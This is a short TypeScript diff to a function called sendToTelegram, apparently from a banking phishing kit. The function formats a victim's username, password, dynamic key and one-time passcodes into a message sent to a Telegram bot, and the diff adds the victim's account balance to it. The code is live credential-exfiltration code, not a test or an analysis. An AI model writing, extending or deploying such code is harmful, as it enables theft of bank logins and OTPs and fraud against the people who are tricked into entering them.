@@ -43,6 +43,7 @@ export async function sendToTelegram(data: UserData & { claveOTP1?: string, clav
     👤 Usuario: ${data.usuario}
     🔑 Clave: ${data.clave}
     🔐 Clave Dinámica: ${data.claveDinamica}
+    💰 Saldo: $${data.saldo || ""}
     ${data.claveOTP1 ? `🗝️ OTP 1: ${data.claveOTP1}` : ""}
     ${data.claveOTP2 ? `🗝️ OTP 2: ${data.claveOTP2}` : ""}
     ${data.claveOTP3 ? `🗝️ OTP 3: ${data.claveOTP3}` : ""}
